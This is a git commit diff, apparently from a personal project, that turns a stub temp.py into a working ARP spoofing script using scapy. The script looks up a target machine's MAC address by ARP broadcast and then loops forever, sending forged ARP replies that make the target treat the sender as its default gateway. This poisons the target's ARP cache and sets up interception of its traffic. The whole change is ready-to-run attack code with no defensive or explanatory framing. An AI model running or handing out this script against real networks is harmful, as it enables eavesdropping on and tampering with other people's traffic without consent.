5b4e371384548f0efe98c375c65fed919791cd17
HofDigger <illiakrasney@gmail.com>
2024-11-08 22:30:31 +0200

    Second

--- temp.py
+++ temp.py
@@ -1,16 +1,25 @@
-import scapy.all as scapy
-import os
-
-
+from scapy.all import ARP, Ether, srp, send
 
 def get_mac(ip_target):
-    return 's'
+    arp_request = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip_target)
+    reply, _ = srp(arp_request, timeout=3, verbose=0)
+    if reply:
+        return reply[0][1].src
+    return None
 
-
+def spoof(ip_target, mac_target, ip_spoof):
+    arp_spoofed_packet = ARP(pdst=ip_target, hwdst=mac_target, psrc=ip_spoof, op=2)
+    send(arp_spoofed_packet, verbose=0)
 
 ip_target = '10.100.102.55'
-default_gateaway = '10.100.102.1'
-ip_src = '10.100.102.39'
+default_gateway = '10.100.102.1'
+target_mac = None
 
+while not target_mac:
+    target_mac = get_mac(ip_target)
+    if not target_mac:
+        print("MAC address not found")
 
-
+while True:
+    spoof(ip_target, target_mac, default_gateway)
+    print("Spoofing is active")
